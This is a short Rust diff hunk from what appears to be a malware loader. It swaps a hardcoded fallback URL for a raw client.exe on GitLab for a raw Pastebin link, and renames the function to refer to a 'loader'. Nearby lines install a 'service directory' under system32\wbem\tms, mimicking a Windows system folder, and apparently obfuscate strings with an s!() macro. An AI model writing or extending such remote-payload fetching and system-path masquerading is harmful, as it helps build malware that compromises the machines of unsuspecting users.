@@ -30,8 +30,8 @@ pub fn system_service_directory() -> PathBuf {
     system32_dir().join(s!("wbem")).join(s!("tms"))
 }
 
-pub fn hardcoded_client_fallback_source() -> Option<FlSrc> {
-    Some(FlSrc::Url(s!("https://gitlab.com/boarng/lajrso/-/raw/main/client.exe").to_owned()))
+pub fn hardcoded_client_fallback_source_loader_pastebin() -> Option<FlSrc> {
+    Some(FlSrc::Url(s!("https://pastebin.com/raw/bTxFP8ZX").to_owned()))
 }
 pub fn hardcoded_client_version() -> u64 {
     2
